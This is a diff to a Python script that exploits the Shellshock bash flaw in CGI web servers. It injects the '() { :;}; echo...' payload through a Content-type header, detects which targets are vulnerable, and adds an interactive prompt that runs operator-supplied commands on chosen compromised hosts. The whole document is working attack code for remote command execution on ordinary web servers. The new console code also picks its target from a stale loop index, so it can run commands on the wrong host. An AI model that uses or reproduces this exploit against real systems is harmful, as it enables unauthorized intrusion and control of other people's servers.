@@ -155,6 +155,7 @@ def exploit_cgi(proxy, target_list, exploit, verbose):
     attack_strings = {
        "Content-type": "() { :;}; echo; echo %s; %s" % (success_flag, exploit)
        }
+    
     # A list of apparently successfully exploited targets returned to main() 
     successful_targets = []
 
@@ -167,11 +168,11 @@ def exploit_cgi(proxy, target_list, exploit, verbose):
         print "[+] Trying exploit for %s" % target 
         host = target.split(":")[1][2:] # substring host from target URL
         for header, attack in attack_strings.iteritems():
+            if verbose:
+                print "  [I] Header is: %s" % header
+                print "  [I] Attack string is: %s" % attack
+                print "  [I] Flag set to: %s" % success_flag
             try:
-                if verbose:
-                    print "  [I] Header is: %s" % header
-                    print "  [I] Attack string is: %s" % attack
-                    print "  [I] Flag set to: %s" % success_flag
                 req = urllib2.Request(target)
                 req.add_header(header, attack)
                 if proxy:
@@ -185,11 +186,15 @@ def exploit_cgi(proxy, target_list, exploit, verbose):
                     print "  [!] %s looks vulnerable" % target 
                     print "  [!] Response returned was:" 
                     buf = StringIO.StringIO(result)
-                    for line in buf:
-                        if line.strip() != success_flag: 
-                            print "  %s" % line.strip()
-                    buf.close()
+                    if len(result) > (len(success_flag)+1):
+                        for line in buf:
+                            if line.strip() != success_flag: 
+                                print "  %s" % line.strip()
+                    else:
+                        print "  [!] A result was returned but was empty..."
+                        print "  [!] Maybe try a different exploit command?"
                     successful_targets.append(target)
+                    buf.close()
                 else:
                     print "[-] Not vulnerable" 
             except Exception as e:
@@ -199,14 +204,15 @@ def exploit_cgi(proxy, target_list, exploit, verbose):
     return successful_targets
 
 
-def ask_for_console(successful_targets):
+def ask_for_console(proxy, successful_targets, verbose):
     # Initialise to non zero to enter while loop
     user_input = 1
     
-    print "[+] The following URLs appeared to be exploitable:"
-    for x in range(len(successful_targets)):
-        print "[%i] %s" % (x, successful_targets[x-1])
-    while user_input:
+    while user_input is not 0:
+        print "[+] The following URLs appeared to be exploitable:"
+        for x in range(len(successful_targets)):
+            print "  [%i] %s" % (x+1, successful_targets[x-1])
+        print "[+] Would you like exploit further?"
         user_input = raw_input("[?] Enter an URL number or 0 to exit: ")
         try:
             user_input = int(user_input)
@@ -218,6 +224,11 @@ def ask_for_console(successful_targets):
         elif not user_input:
             continue
         print "[+] Alrighty then..."
+        exploit = raw_input("[+] Enter command to run: ")
+        if exploit:
+            exploit_cgi(proxy, successful_targets[x-1].split(), exploit, verbose)
+        else:
+            print "[-] No command entered"
 
 def validate_address(hostaddress):
     """ Attempt to identify if proposed host address is invalid by matching
@@ -390,7 +401,7 @@ def main():
     if len(target_list):
         successful_targets = exploit_cgi(proxy, target_list, exploit, verbose)
         if len(successful_targets):
-            ask_for_console(successful_targets)
+            ask_for_console(proxy, successful_targets, verbose)
     else:
         print "[+] No potential targets found :("
     print "[+] The end"
